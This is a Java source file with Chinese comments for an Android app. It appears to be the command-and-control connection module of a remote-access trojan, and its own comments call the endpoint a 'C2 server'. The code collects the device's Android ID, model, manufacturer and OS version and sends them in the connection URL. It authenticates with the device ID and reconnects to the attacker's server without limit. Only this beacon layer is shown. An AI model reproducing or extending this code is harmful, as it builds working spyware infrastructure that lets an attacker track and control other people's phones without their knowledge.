package com.remote.app;

import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.net.URISyntaxException;
import java.security.KeyStore;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManagerFactory;

import io.socket.client.IO;
import io.socket.client.Socket;

/**
 * Socket.IO 单例管理器
 * 处理与 C2 服务器的 WebSocket 连接
 * 
 * 更新日期: 2026年
 * 兼容性: Android 14+ (API 34+)
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;
    private boolean isConnecting = false;

    private IOSocket() {
        initializeSocket();
    }

    /**
     * 初始化 Socket.IO 连接
     */
    private void initializeSocket() {
        try {
            // 获取设备唯一标识符
            String deviceID = Settings.Secure.getString(
                MainService.getContextOfApplication().getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            
            // 构建连接 URL
            String serverUrl = Config.C2_SERVER;
            
            // 验证服务器地址格式
            if (!serverUrl.startsWith("http://") && !serverUrl.startsWith("https://")) {
                serverUrl = "http://" + serverUrl;
            }
            
            Log.d(Config.LOG_TAG, "连接到 C2 服务器: " + serverUrl);
            
            // 配置 Socket.IO 连接选项
            IO.Options opts = new IO.Options();
            
            // 重连配置
            opts.reconnection = true;
            opts.reconnectionDelay = Config.RECONNECTION_DELAY;
            opts.reconnectionDelayMax = Config.RECONNECTION_DELAY_MAX;
            opts.reconnectionAttempts = Integer.MAX_VALUE; // 无限重试
            
            // 传输层配置 - 支持 WebSocket 和 HTTP Long Polling
            opts.transports = new String[]{"websocket", "polling"};
            
            // HTTP 请求头配置
            opts.setAuth("Authorization", "Bearer " + deviceID);
            
            // 超时配置
            opts.timeout = 20000; // 20秒超时
            
            // TLS/SSL 配置 (Android 4.4+ 支持)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                try {
                    // 使用系统默认的信任管理器
                    SSLContext sslContext = SSLContext.getInstance("TLSv1.2");
                    sslContext.init(null, null, null);
                    opts.setSSLContext(sslContext);
                } catch (Exception e) {
                    Log.w(Config.LOG_TAG, "SSL/TLS 初始化失败，使用默认配置: " + e.getMessage());
                }
            }
            
            // 构建完整的连接 URL（包含设备信息查询参数）
            String urlWithParams = buildConnectionUrl(serverUrl, deviceID);
            
            // 创建 Socket 实例
            ioSocket = IO.socket(urlWithParams, opts);
            
            // 注册连接事件监听
            registerConnectionListeners();
            
        } catch (URISyntaxException e) {
            Log.e(Config.LOG_TAG, "Socket.IO URI 格式错误: " + e.getMessage());
            e.printStackTrace();
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "Socket.IO 初始化异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 构建包含设备信息的连接 URL
     */
    private String buildConnectionUrl(String baseUrl, String deviceID) {
        // 编码查询参数
        String model = Uri.encode(Build.MODEL);
        String manufacturer = Uri.encode(Build.MANUFACTURER);
        String release = Uri.encode(Build.VERSION.RELEASE);
        String apiLevel = String.valueOf(Build.VERSION.SDK_INT);
        
        // 构建完整 URL
        return String.format("%s?model=%s&manf=%s&release=%s&api=%s&id=%s",
            baseUrl, model, manufacturer, release, apiLevel, deviceID);
    }

    /**
     * 注册连接事件监听器
     */
    private void registerConnectionListeners() {
        if (ioSocket == null) return;
        
        ioSocket.on(Socket.EVENT_CONNECT, args -> {
            Log.i(Config.LOG_TAG, "Socket.IO 已连接");
            isConnecting = false;
        });
        
        ioSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(Config.LOG_TAG, "Socket.IO 连接错误: " + (args.length > 0 ? args[0].toString() : "未知错误"));
        });
        
        ioSocket.on(Socket.EVENT_DISCONNECT, args -> {
            Log.w(Config.LOG_TAG, "Socket.IO 已断开连接");
            isConnecting = false;
        });
        
        ioSocket.on(Socket.EVENT_RECONNECT_ATTEMPT, args -> {
            Log.d(Config.LOG_TAG, "尝试重新连接...");
            isConnecting = true;
        });
    }

    /**
     * 获取单例实例
     */
    public static IOSocket getInstance() {
        return ourInstance;
    }

    /**
     * 获取 Socket.IO 对象
     */
    public Socket getIoSocket() {
        return ioSocket;
    }

    /**
     * 检查连接状态
     */
    public boolean isConnected() {
        return ioSocket != null && ioSocket.connected();
    }

    /**
     * 获取连接状态
     */
    public boolean isConnecting() {
        return isConnecting;
    }

    /**
     * 重新连接
     */
    public void reconnect() {
        if (ioSocket != null) {
            ioSocket.disconnect();
            ioSocket.connect();
        }
    }

    /**
     * 断开连接
     */
    public void disconnect() {
        if (ioSocket != null) {
            ioSocket.disconnect();
            ioSocket = null;
        }
    }
}
